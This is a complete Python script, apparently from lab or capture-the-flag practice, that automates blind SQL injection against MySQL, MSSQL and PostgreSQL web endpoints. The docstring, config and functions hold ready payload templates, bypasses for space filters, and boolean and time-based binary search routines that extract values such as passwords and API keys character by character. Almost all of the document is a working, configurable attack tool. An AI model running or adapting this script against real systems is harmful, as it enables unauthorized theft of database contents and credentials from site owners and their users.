#!/usr/bin/env python3
"""
Universal Blind SQLi Dumper — Multi-Dialect, Multi-Mode (Template)
====================================================================
Supports both boolean-based and time-based blind SQLi in one script.
Works with MySQL, MSSQL, and PostgreSQL.

Config: URL, METHOD, PARAM, EXTRA_PARAMS, COOKIE, MODE, DIALECT, SUBQUERY, TRUE_MARKER/SLEEP_SEC
        SUBQUERY: any SELECT that returns a single value (the secret to dump)

How it works:
  - Boolean mode: injects payload, checks if TRUE_MARKER is in response
  - Time mode: injects payload with SLEEP(), measures response time
  - Binary search on ASCII 32-126: ~7 requests per char
  - Dynamic length discovery: tests LENGTH()=1, 2, 3, ... (no hardcoded length)

Dialect differences:
  mysql:    SUBSTRING, ASCII, SLEEP(), /**/ space bypass
  mssql:    SUBSTRING, ASCII, WAITFOR DELAY, + space bypass
  postgres: SUBSTR,    ASCII, pg_sleep(),  /**/ space bypass

CRITICAL PITFALLS (learned from real lab testing):
  1. MySQL does NOT accept LENGTH((subquery)) directly in a boolean condition.
     The dialect templates must use SELECT/**/LENGTH(({sub})) — wrapping the
     subquery in its own parens inside LENGTH, prefixed with SELECT.
     Without SELECT prefix, the condition silently returns 0 (always FALSE).
  2. Spaces in SUBQUERY must be replaced with the dialect's space-bypass char
     (/**/ for MySQL/PostgreSQL, + for MSSQL). This is done automatically.
  3. EXTRA_PARAMS is essential for endpoints that require additional URL params
     (e.g., user_id=14 alongside the injectable receiver_id).

Usage:
  1. Set MODE ("boolean" or "time"), DIALECT ("mysql"/"mssql"/"postgres")
  2. Set SUBQUERY to the SELECT statement that returns the target value
  3. For boolean: set TRUE_MARKER (string in response when condition is true)
  4. For time: set SLEEP_SEC (seconds for SLEEP delay)
  5. Set EXTRA_PARAMS for any required non-injectable URL parameters
  6. Override PAYLOAD_TEMPLATE if needed (auto-selected by dialect+mode)
  7. python blind_universal_dumper.py
"""
import requests
import time
import sys

# ==================== CONFIG ====================

# --- HTTP ---
URL = "http://target.com/page"
METHOD = "GET"                          # "GET" or "POST"
PARAM = "id"                            # injectable parameter name
EXTRA_PARAMS = {}                       # extra URL params, e.g. {"user_id": "14"}
COOKIE_NAME = "PHPSESSID"               # session cookie name (JSESSIONID, etc.)
COOKIE_VALUE = ""                       # "your_session" or "" if none needed

# --- Mode: "boolean" or "time" ---
MODE = "boolean"

# --- Boolean mode ---
TRUE_MARKER = "Success"                 # string in response when condition is TRUE

# --- Time mode ---
SLEEP_SEC = 2                           # SLEEP seconds for TRUE condition

# --- SQL Dialect: "mysql", "mssql", "postgres" ---
DIALECT = "mysql"

# --- SQL: subquery that returns the value to dump ---
# Examples:
#   SELECT secret FROM config WHERE id=1
#   SELECT api_key FROM apps WHERE name=admin LIMIT 1
#   SELECT password FROM users WHERE id=1
SUBQUERY = "SELECT secret FROM config WHERE id=1"

# --- Payload template (auto-selected if left empty) ---
# Override only if the auto template doesn't fit your injection point.
# {cond} is replaced with the boolean condition.
# Boolean examples:
#   "-1/**/OR/**/({cond})"          (MySQL, space-filtered, second-operand AND)
#   "1 OR ({cond})"                 (MySQL, no space filter)
# Time examples:
#   "1 OR IF(({cond}),SLEEP(2),0)"              (MySQL)
#   "1; IF(({cond})) WAITFOR DELAY '0:0:2'--"   (MSSQL)
#   "1 OR (CASE WHEN ({cond}) THEN pg_sleep(2) ELSE 1 END)"  (PostgreSQL)
PAYLOAD_TEMPLATE = ""

# --- Charset: ASCII range for binary search (32-126 = printable) ---
CHARSET_MIN = 32
CHARSET_MAX = 126

# ==================== END CONFIG ====================

# Dialect-specific SQL functions
# IMPORTANT: MySQL templates use SELECT/**/ prefix because MySQL does not accept
# LENGTH((subquery)) or ASCII(SUBSTRING((subquery),...)) directly in a boolean
# condition without a SELECT wrapper. The subquery must be in its own parens.
DIALECTS = {
    "mysql": {
        "space": "/**/",
        "length": "SELECT/**/LENGTH(({sub}))",
        "ascii": "SELECT/**/ASCII(SUBSTRING(({sub}),{pos},1))",
        "sleep_payload": "1 OR IF(({cond}),SLEEP({sec}),0)",
        "bool_payload": "-1/**/OR/**/({cond})",
    },
    "mssql": {
        "space": "+",
        "length": "SELECT LEN(({sub}))",
        "ascii": "SELECT ASCII(SUBSTRING(({sub}),{pos},1))",
        "sleep_payload": "1; IF(({cond})) WAITFOR DELAY '0:0:{sec}'--",
        "bool_payload": "1 OR ({cond})",
    },
    "postgres": {
        "space": "/**/",
        "length": "SELECT LENGTH(({sub}))",
        "ascii": "SELECT ASCII(SUBSTR(({sub}),{pos},1))",
        "sleep_payload": "1 OR (CASE WHEN ({cond}) THEN pg_sleep({sec}) ELSE 1 END)",
        "bool_payload": "-1/**/OR/**/({cond})",
    },
}

d = DIALECTS[DIALECT]
if not PAYLOAD_TEMPLATE:
    PAYLOAD_TEMPLATE = d["bool_payload"] if MODE == "boolean" else d["sleep_payload"].replace("{sec}", str(SLEEP_SEC))

# Replace spaces in SUBQUERY with dialect-specific space bypass
# Many SQLi targets filter spaces (e.g., PHP strpos check)
SUBQUERY = SUBQUERY.replace(" ", d["space"])

COOKIES = {COOKIE_NAME: COOKIE_VALUE} if COOKIE_VALUE else {}


def check(condition):
    """Send payload, return True if condition is TRUE."""
    payload = PAYLOAD_TEMPLATE.replace("{cond}", condition)
    data = {**EXTRA_PARAMS, PARAM: payload}

    if MODE == "time":
        start = time.time()
        _send(data)
        return time.time() - start >= SLEEP_SEC
    else:
        r = _send(data)
        return TRUE_MARKER in r.text


def _send(data):
    """Send HTTP request, return response object."""
    if METHOD == "POST":
        return requests.post(URL, data=data, cookies=COOKIES, timeout=15)
    else:
        return requests.get(URL, params=data, cookies=COOKIES, timeout=15)


def get_length():
    """Discover value length: test LENGTH=1, 2, 3, ..."""
    for n in range(1, 500):
        cond = d["length"].replace("{sub}", SUBQUERY) + "=" + str(n)
        if check(cond):
            return n
    return 0


def get_char(pos):
    """Extract char at position pos using binary search on ASCII range."""
    low, high = CHARSET_MIN, CHARSET_MAX
    while low < high:
        mid = (low + high) // 2
        cond = d["ascii"].replace("{sub}", SUBQUERY).replace("{pos}", str(pos)) + ">" + str(mid)
        if check(cond):
            low = mid + 1
        else:
            high = mid
    return chr(low)


def main():
    print("=" * 55)
    print("  Blind SQLi Dumper")
    print("=" * 55)
    print("  URL     :", URL)
    print("  Method  :", METHOD, "(" + PARAM + "=...)")
    print("  Mode    :", MODE)
    print("  Dialect :", DIALECT)
    if MODE == "boolean":
        print("  Marker  : '" + TRUE_MARKER + "'")
    else:
        print("  Sleep   :", SLEEP_SEC, "s")
    print("  Query   :", SUBQUERY)
    print("  Payload :", PAYLOAD_TEMPLATE)
    print("=" * 55)
    print()

    # Sanity check
    print("[*] Sanity check...")
    t = check("1=1")
    f = check("1=2")
    if MODE == "time":
        if not t:
            print("[!] FAIL: 1=1 did not SLEEP (expected slow)")
            sys.exit(1)
        if f:
            print("[!] FAIL: 1=2 also SLEEP'd (expected fast)")
            sys.exit(1)
        print("[+] OK! 1=1=SLEEP, 1=2=fast")
    else:
        if not t:
            print("[!] FAIL: 1=1 no marker '" + TRUE_MARKER + "'")
            sys.exit(1)
        if f:
            print("[!] FAIL: 1=2 still has marker '" + TRUE_MARKER + "'")
            sys.exit(1)
        print("[+] OK! 1=1=marker, 1=2=no marker")
    print()

    # Discover length
    print("[*] Finding length...")
    length = get_length()
    if length == 0:
        print("[!] Value is empty or NULL")
        sys.exit(1)
    print("[+] Length:", length)
    print()

    # Extract
    print("[*] Dumping...")
    print()
    result = ""
    for pos in range(1, length + 1):
        c = get_char(pos)
        result += c
        pct = int(pos / length * 100)
        bar = "#" * (pct // 5) + "-" * (20 - pct // 5)
        print("  [" + str(pos) + "/" + str(length) + "] " + bar + " " + str(pct).rjust(3) + "%  =>  " + result)

    print()
    print("=" * 55)
    print("  RESULT:", result)
    print("=" * 55)


if __name__ == "__main__":
    main()
